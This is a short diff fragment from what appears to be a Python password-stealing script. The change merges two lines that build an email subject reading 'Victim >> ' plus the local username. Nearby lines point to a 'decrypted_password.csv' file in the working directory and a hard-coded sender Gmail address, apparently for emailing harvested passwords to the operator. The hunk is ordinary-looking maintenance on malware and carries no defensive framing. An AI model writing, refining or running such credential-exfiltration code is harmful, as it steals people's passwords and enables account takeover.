@@ -135,8 +135,7 @@ if __name__ == '__main__':
         pass
     finally:
         a = os.getcwd()
-        user = os.getlogin()
-        subject = f"Victim >> {user}"
+        subject = f"Victim >> {os.getlogin()}"
         body = ""
         path = f"{a}\\decrypted_password.csv"
         sender_email = 'iamqwertyfish@gmail.com'
